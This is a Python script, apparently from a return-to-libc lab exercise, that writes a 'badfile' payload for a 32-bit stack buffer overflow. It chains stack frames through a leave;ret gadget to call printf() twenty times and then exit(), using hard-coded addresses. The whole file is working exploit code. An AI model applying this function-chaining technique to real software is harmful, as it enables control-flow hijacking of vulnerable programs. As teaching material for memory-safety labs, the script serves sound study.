#!/usr/bin/python3
import sys

def tobytes (value):
   return (value).to_bytes(4,byteorder='little')

leaveret    = 0x565562ce   # Address of leaveret
sh_addr     = 0xffffdfe4   # Address of "/bin/sh"
printf_addr = 0xf7e21de0   # Address of printf()
exit_addr   = 0xf7e05f80   # Address of exit()
ebp_foo     = 0xffffc8f8   # foo()'s frame pointer

content   = bytearray(0xaa for i in range(112))

# From foo() to the first function
ebp_next  = ebp_foo + 0x20
content  += tobytes(ebp_next)
content  += tobytes(leaveret)
content  += b'A' * (0x20 - 2*4)

# printf()
for i in range(20):
  ebp_next += 0x20
  content  += tobytes(ebp_next)
  content  += tobytes(printf_addr)
  content  += tobytes(leaveret)
  content  += tobytes(sh_addr)   
  content  += b'A' * (0x20 - 4*4)

# exit()
content += tobytes(0xFFFFFFFF) # The value is not important
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
  f.write(content)

